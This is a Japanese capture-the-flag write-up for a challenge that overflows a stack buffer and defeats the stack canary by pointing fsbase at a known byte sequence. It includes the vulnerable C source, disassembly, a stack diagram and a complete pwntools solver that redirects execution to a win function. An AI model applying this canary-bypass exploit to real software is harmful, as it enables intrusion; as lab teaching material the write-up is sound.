# fsbase modification

## 問題

vuln関数にはスタックバッファオーバーフローの脆弱性があります。しかし戻りアドレスを改変してもstack canaryがあるため異常終了してしまいます。

ただ今回は、vuln関数が呼び出される前にfsbaseというものを設定できるようです。

```c
void __attribute__((__used__)) win(void) {
    char *argv[] = {"/bin/cat", "/flag.txt", NULL};
    syscall(SYS_execve, argv[0], argv, NULL);
}

void vuln(void) {
    char buf[8] = {0};
    write(STDOUT_FILENO, "Please leave a message> ", 24);
    read(STDIN_FILENO, buf, 32);
}

int main(void) {
    write(STDOUT_FILENO, "fsbase(-1 for testing a default vuln behavior): ", 48);
    char buf[32] = {0};
    read(STDIN_FILENO, buf, sizeof(buf) - 1);
    unsigned long fsbase = strtoul(buf, NULL, 10);

    int result = syscall(SYS_arch_prctl, ARCH_SET_FS, fsbase);
    if (result < 0) {
        write(STDOUT_FILENO, "arch_prctl failed.\n", 19);
    }

    vuln();
}
```

## 概要

問題文に示されているとおり、`vuln`関数では8バイトの`buf`に対して32バイト入力できるので、BOFを用いてリターンアドレスを書き換えることができそうに見えます。

しかし、スタックカナリアが有効であり、そのまま書き換えるとスタック破壊を検知され強制終了してしまうのでできません。

今回はカナリアをリークさせるような仕組みは無さそうですが、`fsbase`を設定できるとのことです。

例によってどこからも呼び出されていない`win`関数を実行するにはどうすればいいのでしょうか？

## 方針

`fsbase`を調整してカナリアの値を既知のものにごまかす。

## 解法

今後よく見ると思うので、最初に`chal`をアセンブリ化してみました。
```
$ objdump -d chal > asm.txt
```

さて、`vuln`関数の最後の部分をアセンブリで見てみると、
```
  401278:	48 8b 45 f8          	mov    -0x8(%rbp),%rax               # スタック上のカナリアの値を%raxレジスタに入れる
  40127c:	64 48 2b 04 25 28 00 	sub    %fs:0x28,%rax                 # 正解の値を%raxから引く
  401283:	00 00 
  401285:	74 05                	je     40128c <vuln+0x67>            # 計算結果が0なら次の★をとばす
  401287:	e8 04 fe ff ff       	call   401090 <__stack_chk_fail@plt> # ★スタックの破壊を検知！
  40128c:	c9                   	leave                                # エピローグ処理
  40128d:	c3                   	ret                                  # リターンアドレスに飛ぶ
```
となっていることからもわかるように、正しいカナリアの値は`%fs:0x28`すなわちfsbase + 0x28の場所から取得します。

今回、`fsbase`を変えることができるので、もしこれを(既知の8バイトがあるアドレス) - 0x28に設定することができれば、カナリアの値を知ることができそうです。

カナリアをリークさせることができないなら、好きな場所の値にごまかしてしまえという考えです。

さて、どこを使いましょうか？

例えば`main`関数の最初の部分を見てみると、
```
000000000040128e <main>:
  40128e:	f3 0f 1e fa          	endbr64
  401292:	55                   	push   %rbp
  401293:	48 89 e5             	mov    %rsp,%rbp
  ...
```
となっています。

`-no-pie`オプションによってこのアドレスは固定されるので、利用できそうです。

これを利用したいのであれば、「fsbase」の入力を求められたときに入力する値は 0x40128e - 0x28 = 4199014 となります。

そうすると、（偽物の）スタックカナリアは、ここにある8バイトの 0xe5894855fa1e0ff3 になるでしょう。

次に「massage」の入力を求められたときに送るペイロードを組み立てます。

※余談ですが、この「Please leave a message」の「leave」は「離れる」という意味ではなく「（メッセージを）残す」という意味なのですね。知りませんでした。

`vuln`関数を見てみると、
```
0000000000401225 <vuln>:
  401225:	f3 0f 1e fa          	endbr64
  401229:	55                   	push   %rbp       # ベースポインタ退避
  40122a:	48 89 e5             	mov    %rsp,%rbp  # スタックを空にする
  40122d:	48 83 ec 10          	sub    $0x10,%rsp # ローカル領域確保
```
であることから、ローカル領域（ベースポインタとスタックポインタの間）のサイズが0x10=16バイトであることがわかります。

また、その中に0x8にあるスタックカナリアも含まれるので、消去法で`buf`があるのはrbp-0x10であることがわかります。

よって、`vuln`関数が呼び出されたときのスタックの状態は下記のようになるでしょう。
```
↑高アドレス
----------------------
戻り先アドレス(8)
---------------------- rbp+8
退避ベースポインタ(8)
---------------------- rbp ←ベースポインタ
スタックカナリア (8)
---------------------- rbp-8
buf[7]～[0] (8)
---------------------- rbp-16 ←スタックポインタ
↓低アドレス
```

以上より、ペイロードには、
```
ダミー(8) + 偽スタックカナリア(8) + ダミー(8) + win関数のアドレス(8)
```
を仕込めばいいことになります。

win関数のアドレスは、
```
00000000004011b6 <win>:
```
より、0x4011b6であることがわかります。

## ソルバー

```py
from pwn import *

HOST, PORT = "localhost", 1337
# HOST, PORT = "34.170.146.252", 37571
p = remote(HOST, PORT)

main_adr = 0x40128e
fake_canary = 0xe5894855fa1e0ff3
win_adr = 0x4011b6

p.sendlineafter(b'behavior): ', str(main_adr - 0x28).encode())
payload = p64(0) + p64(fake_canary) + p64(0) + p64(win_adr)
p.sendlineafter(b'message> ', payload)
print(p.recvall())
```
